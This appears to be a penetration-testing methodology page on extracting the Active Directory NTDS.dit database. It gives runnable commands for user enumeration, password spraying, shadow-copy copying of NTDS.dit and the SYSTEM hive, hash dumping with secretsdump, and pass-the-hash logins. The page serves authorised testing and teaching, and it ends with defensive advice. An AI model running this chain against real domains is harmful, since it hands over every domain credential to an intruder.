---
layout: page
title: "NTDS.dit"
subtitle: "Domain credential extraction from a domain controller, from username lists to shadow copy and hash reuse"
permalink: /methodology/passwords/ntds-dit/
---

NTDS.dit is the Active Directory database. It stores every domain account, its password hash and related schema data, and it lives on each domain controller under the system root's `NTDS` folder. Extracting it is the most consequential credential attack in a Windows domain, so this page covers the path that leads to it: building a username list, validating accounts, checking for the right privileges, copying the database from a shadow copy, and extracting hashes offline.

## 1. Build a username list

Organisations follow predictable naming conventions. Generate candidates from the names found during OSINT or from email addresses (`username@domain`).

| Convention | Example for Jane Jill Doe |
|------------|---------------------------|
| `firstinitiallastname` | jdoe |
| `firstnamelastname` | janedoe |
| `firstname.lastname` | jane.doe |
| `lastname.firstname` | doe.jane |

Expand the list with a generator such as username-anarchy:

```bash
./username-anarchy -i names.txt
```

## 2. Validate usernames

Kerberos-based enumeration confirms which candidates exist without requiring a password:

```bash
./kerbrute_linux_amd64 userenum --dc TARGET_IP --domain DOMAIN names.txt
```

## 3. Password spraying

Spray one or two passwords across the valid accounts, not a long list against one account. Confirm the lockout policy first. The notes record that default domain Group Policy does not enforce an account lockout threshold, but the organisation may have changed it.

```bash
netexec smb TARGET_IP -u USERNAME -p /usr/share/wordlists/fasttrack.txt
```

## 4. Check privileges

Copying NTDS.dit needs local administrator rights on a domain controller or Domain Admin rights. Connect with the valid account and check membership:

```powershell
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
net user USERNAME
```

Stop if the account lacks these rights. The rest of this page does not apply.

## 5. Create a shadow copy and copy NTDS.dit

Volume Shadow Copy allows the database to be read while it is in use:

```powershell
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

Replace `HarddiskVolumeShadowCopy2` with the number that `vssadmin` reports. Also save the SYSTEM hive, because the database is encrypted with keys stored there:

```powershell
reg.exe save hklm\system C:\NTDS\SYSTEM
```

Transfer both files to the attack host through an approved channel.

## 6. Extract the hashes

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

The output uses the format `domain\user:rid:lmhash:nthash`, and includes the `krbtgt` and machine accounts. A faster remote option uses the NetExec `ntdsutil` module with valid domain credentials:

```bash
netexec smb TARGET_IP -u USERNAME -p PASSWORD -M ntdsutil
```

## 7. Decide what to do with the hashes

- Crack the NT hashes with Hashcat mode `1000` against approved wordlists and rules.
- If cracking fails or takes too long, use pass-the-hash. NTLM authentication accepts the hash in place of the password:

```bash
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

## What to look for

- Administrator and service accounts whose hashes are reused across other hosts.
- Stale accounts that remain enabled.
- The `krbtgt` hash, which is the most sensitive value in the file. Record its presence and handle it under the rules of engagement.

> NTDS.dit and the SYSTEM hive together reveal every domain credential. Store them encrypted, restrict who can read them, and destroy them at the end of the engagement.
{: .danger }

## Pitfalls

- Copying the database without the SYSTEM hive yields nothing usable.
- A shadow copy left on the domain controller is an artefact. Remove it after the copy is complete and document the removal.
- Spraying too quickly can lock accounts. Confirm the lockout threshold before running any spray.

## Defense and prevention

Use a tiered administration model so Domain Admin credentials are never used on workstations. Restrict and monitor volume shadow copy creation and reads of NTDS.dit on domain controllers. Enforce an account lockout policy, and rotate privileged credentials after any suspected extraction. See the [password prevention](/methodology/passwords/prevention/) page.
